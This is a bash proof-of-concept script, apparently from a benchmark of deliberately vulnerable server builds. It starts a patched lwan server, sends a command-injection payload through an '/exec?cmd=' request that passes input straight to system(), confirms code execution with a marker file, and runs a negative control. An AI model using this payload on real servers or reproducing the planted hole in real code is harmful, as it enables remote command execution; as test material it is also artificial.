#!/usr/bin/env bash
# PoC for 085_lwan_C2I1S1
# Axes: C2 (two flags in struct) / I1 (direct to system()) / S1 (no sanitization)
#
# The vulnerability: exec_cfg struct has two flags (enabled, verbose).
# cmd flows directly into system() with no sanitization.
#
# The patched binary (lwan) lives in this directory. If absent, run build.sh.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_085_www"
MARKER="/tmp/poc_085_marker"
PORT=18085
NEG_PORT=19085

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        # also kill worker threads that survive the main process
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    # release port in case worker threads still hold it
    fuser -k 18085/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# start server ───────────────────────────────────────────────────────────────────
echo "[*] starting lwan with --exec-mode on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-mode &
SERVER_PID=$!
sleep 1.0

# # trigger ─────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

sleep 0.3

# verify ─────────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# negative control: endpoint absent without --exec-mode ──────────────────────────
echo "[*] verifying gate: endpoint must return 404 without --exec-mode..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k 18085/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?id" || true)
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k 19085/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
